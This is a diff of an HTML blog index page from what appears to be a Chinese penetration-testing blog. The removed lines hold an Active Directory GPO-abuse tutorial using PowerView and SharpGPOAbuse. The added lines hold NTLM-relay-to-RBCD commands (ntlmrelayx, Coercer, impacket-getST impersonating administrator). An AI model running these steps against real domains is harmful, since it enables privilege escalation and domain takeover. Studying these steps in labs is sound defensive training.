-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$identity</span> = (<span class="built_in">Get-DomainGPO</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com).distinguishedname <span class="operator">-replace</span> <span class="string">&#x27;CN=\&#123;[A-F0-9-]+\&#125;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>; <span class="built_in">Get-DomainObjectACL</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com <span class="literal">-Identity</span> <span class="variable">$identity</span> | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ActiveDirectoryRights <span class="operator">-contains</span> <span class="string">&quot;CreateChild&quot;</span> <span class="operator">-and</span> <span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="string">&#x27;^S-1-5-.*-[1-9]\d&#123;3,&#125;$&#x27;</span> &#125; | <span class="keyword">foreach</span> &#123; <span class="built_in">ConvertFrom-SID</span> <span class="variable">$_</span>.SecurityIdentifier <span class="literal">-server</span> dc.<span class="number">123</span>.com&#125;</span><br></pre></td></tr></table></figure>
+<h3><span id="攻击机器启动ntlmrelayx以利用rbcd">攻击机器启动ntlmrelayx以利用RBCD</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-ntlmrelayx -smb2support -t ldap://10.0.0.2 --no-da --no-acl --delegate-access</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/72.png" alt="72"></p>
-<p>要创建一个新的 GPO，我们可以使用 Windows 的GroupPolicy模块 ，该模块是 Windows 远程服务器管理工具（RSAT）的一部分，通常可以在服务器上找到。</p>
-<p>另外，我们还可以使用 PowerGPOAbuse 工具。尽管在测试过程中某些功能没有正常工作，但它仍然为我们提供了一个很好的机会，去探索该工具在 GPO 滥用方面的能力。</p>
-<p>要确认 GroupPolicy 模块是否已安装，我们可以使用以下 PowerShell 命令：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-Command</span> <span class="literal">-Module</span> GroupPolicy</span><br></pre></td></tr></table></figure>
+<h3><span id="使用coercer触发强制认证">使用Coercer触发强制认证</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains python3 Coercer.py coerce --auth-type http --http-port 8081 --filter-method-name EfsRpcDecryptFileSrv -u <span class="string">&#x27;123&#x27;</span> -p <span class="string">&#x27;123&#x27;</span> -d 123.com -t 123.123.com -l 1234</span><br></pre></td></tr></table></figure>
 
-<p>接着我们使用一下命令创建一个新的GPO:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$domainController</span> = <span class="string">&quot;dc.123.com&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$gpoName</span> = <span class="string">&quot;MyNewGPO&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$gpoDN</span> = <span class="string">&quot;CN=<span class="variable">$gpoName</span>,CN=Policies,CN=System,DC=plho,DC=com&quot;</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">New-ADObject</span> <span class="literal">-Name</span> <span class="variable">$gpoName</span> <span class="literal">-Type</span> <span class="string">&quot;groupPolicyContainer&quot;</span> <span class="literal">-Path</span> <span class="string">&quot;CN=Policies,CN=System,DC=plho,DC=com&quot;</span> <span class="literal">-Server</span> <span class="variable">$domainController</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/29.png" alt="29"></p>
+<h3><span id="使用impacket-getst进行完整的s4u获取票据">使用impacket-getST进行完整的S4U获取票据</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  kali proxychains impacket-getST -spn cifs/123.123.com -impersonate administrator <span class="string">&#x27;123.com/HSJEXRLK$:5wfZ&#125;igoDlUeM:1&#x27;</span> -dc-ip 192.168.1.1</span><br></pre></td></tr></table></figure>
 
-<h3><span id="searching-for-users-with-rights-to-link-gpos">Searching for users with rights to Link GPOs</span></h3><p>正如我们之前讨论的，GPO 可以链接到三个不同的位置：站点（Sites）、域（Domains）和组织单位（OUs）。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainSite</span> <span class="literal">-Properties</span> distinguishedname | <span class="keyword">foreach</span> &#123; <span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-SearchBase</span> <span class="variable">$_</span>.distinguishedname <span class="literal">-ResolveGUIDs</span> | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ObjectAceType <span class="operator">-eq</span> <span class="string">&quot;GP-Link&quot;</span> <span class="operator">-and</span> <span class="variable">$_</span>.ActiveDirectoryRights <span class="operator">-match</span> <span class="string">&quot;WriteProperty&quot;</span> &#125; | <span class="built_in">select</span> ObjectDN, <span class="selector-tag">@</span>&#123;Name=<span class="string">&#x27;ResolvedSID&#x27;</span>;Expression= &#123;<span class="built_in">ConvertFrom-SID</span> <span class="variable">$_</span>.SecurityIdentifier&#125;&#125; | <span class="built_in">Format-List</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-SearchScope</span> Base <span class="literal">-server</span> dc.<span class="number">123</span>.com | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ObjectAceType <span class="operator">-eq</span> <span class="string">&quot;GP-Link&quot;</span> <span class="operator">-and</span> <span class="variable">$_</span>.ActiveDirectoryRights <span class="operator">-match</span> <span class="string">&quot;WriteProperty&quot;</span> &#125; | <span class="built_in">select</span> ObjectDN, <span class="selector-tag">@</span>&#123;Name=<span class="string">&#x27;ResolvedSID&#x27;</span>;Expression= &#123;<span class="built_in">ConvertFrom-SID</span> <span class="variable">$_</span>.SecurityIdentifier <span class="literal">-server</span> dc.<span class="number">123</span>.com &#125;&#125; | <span class="built_in">Format-List</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainOU</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com | <span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-server</span> dc.<span class="number">123</span>.com | <span class="built_in">where</span> &#123; <span class="variable">$_</span>.ObjectAceType <span class="operator">-eq</span> <span class="string">&quot;GP-Link&quot;</span> <span class="operator">-and</span> <span class="variable">$_</span>.ActiveDirectoryRights <span class="operator">-match</span> <span class="string">&quot;WriteProperty&quot;</span> &#125; | <span class="built_in">select</span> ObjectDN, <span class="selector-tag">@</span>&#123;Name=<span class="string">&#x27;ResolvedSID&#x27;</span>;Expression= &#123;<span class="built_in">ConvertFrom-SID</span> <span class="variable">$_</span>.SecurityIdentifier <span class="literal">-server</span> dc.<span class="number">123</span>.com&#125;&#125; | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure>
-
-<p>此外，我们可以使用工具 Get-GPOEnumeration，这是一个封装器，利用 PowerView 来自动化 GPO 枚举。如果不指定任何参数，该函数会使用 PowerView 查找所有非管理员用户有权限修改的 GPO，并确定它们的链接位置。此外，它还可以通过以下参数检查修改 GPO 的权限：</p>
-<ul>
-<li><strong>-ModifyGPOs</strong>：修改 GPO 的权限</li>
-<li><strong>-LinkGPOs</strong>：链接 GPO 的权限</li>
-<li><strong>-CreateGPO</strong>：创建 GPO 的权限</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Get-GPOEnumeration</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-GPOEnumeration</span></span><br></pre></td></tr></table></figure>
-
-<p>在上述命令中，Server Admins 组有权限修改 GPO Default Domain Policy，该 GPO 应用于 Domain: inlanefreight 范围。</p>
-<h3><span id="link-gpos">Link GPOs</span></h3><p>要链接一个 GPO，我们可以使用 GroupPolicy 模块，并使用命令 New-GPLink，指定 GPO 名称，选项 -Name 和选项 -Target ：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">New-GPLink</span> <span class="literal">-Name</span> TestGPO <span class="literal">-Target</span> <span class="string">&quot;OU=TestOU,DC=inlanefreight,DC=local&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2><span id="abusing-gpos-from-windows">Abusing GPOs from Windows</span></h2><p>为了滥用 GPO，我们可以使用 SharpGPOAbuse，这是一个用 C# 编写的 .NET 应用程序，可以利用用户在组策略对象（GPO）上的编辑权限，来妥协该 GPO 控制的对象。目前，SharpGPOAbuse 支持以下选项：</p>
-<p>以下是 SharpGPOAbuse 支持的选项的翻译和表格形式：</p>
-<table>
-<thead>
-<tr>
-<th><strong>选项</strong></th>
-<th><strong>描述</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>--AddUserRights</code></td>
-<td>向用户添加权限</td>
-</tr>
-<tr>
-<td><code>--AddLocalAdmin</code></td>
-<td>将用户添加到本地管理员组</td>
-</tr>
-<tr>
-<td><code>--AddComputerScript</code></td>
-<td>添加新的计算机启动脚本</td>
-</tr>
-<tr>
-<td><code>--AddUserScript</code></td>
-<td>配置用户登录脚本</td>
-</tr>
-<tr>
-<td><code>--AddComputerTask</code></td>
-<td>配置计算机的即时任务</td>
-</tr>
-<tr>
-<td><code>--AddUserTask</code></td>
-<td>向用户添加即时任务</td>
-</tr>
-</tbody></table>
-<p>我们来使用 <code>--AddLocalAdmin</code> 选项，向用户添加即时任务。我们需要使用选项 <code>--UserAccount &lt;账户名称&gt;</code> 来指定我们想要授予管理员访问权限的账户，使用选项 <code>--GPOName &lt;策略名称&gt;</code> 来指定 GPO 的名称。请注意，我们必须在我们想要滥用权限的账户的上下文中运行：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpGPOAbuse.exe <span class="literal">--AddLocalAdmin</span> <span class="literal">--UserAccount</span> gabriel <span class="literal">--GPOName</span> <span class="string">&quot;Default Security Policy - WKS&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>注意：请记住，使用 <code>--AddLocalAdmin</code> 选项将覆盖任何现有的管理员账户，如果此策略优先级更高的话。如果在机器上本地设置了管理员或其他选项，这些设置将被替换，可能会导致问题。建议在受控环境（如本实验室）中进行这些更改的实验。</p>
-<p><code>SharpGPOAbuse</code> 会创建 GPO 文件并将其放置在相应的目录中。我们可以打开文件位置查看其内容：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">cat</span> <span class="string">&quot;\\inlanefreight.local\SysVol\inlanefreight.local\Policies\&#123;EF1EBF2A-08F248E0-9D2E-67D9F2CE875D&#125;\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/images/30.png" alt="30"></p>
 
 	
 	</div>
-  <a type="button" href="/2024/12/01/AD-滥用DACL/#more" class="btn btn-default more">Read More</a>
+  <a type="button" href="/2024/12/03/AD-NTLM Relay/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -625,24 +272,13 @@
 	<div id="sidebar">
 	
 			
-  <div id="site_search">
-   <div class="form-group">
-    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
-   </div>  
-  <div id="local-search-result"></div>
-  </div>
-
-
-		
-			
-		
-			
-
-		
-			
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/12/20/C2基础设施搭建/" ><i class="fa fa-file-o"></i>C2基础设施搭建</a>
+      </li>
     
       <li>
         <a href="/2024/12/10/OffensiveWindows攻击平台搭建/" ><i class="fa fa-file-o"></i>OffensiveWindows攻击平台搭建</a>
@@ -658,10 +294,6 @@
     
       <li>
         <a href="/2024/12/01/AD-kerberos中的委派/" ><i class="fa fa-file-o"></i>AD-Kerberos中的委派</a>
-      </li>
-    
-      <li>
-        <a href="/2024/11/29/解密chrome浏览器账号密码/" ><i class="fa fa-file-o"></i>解密chrome浏览器账号密码</a>
       </li>
     
   </ul>
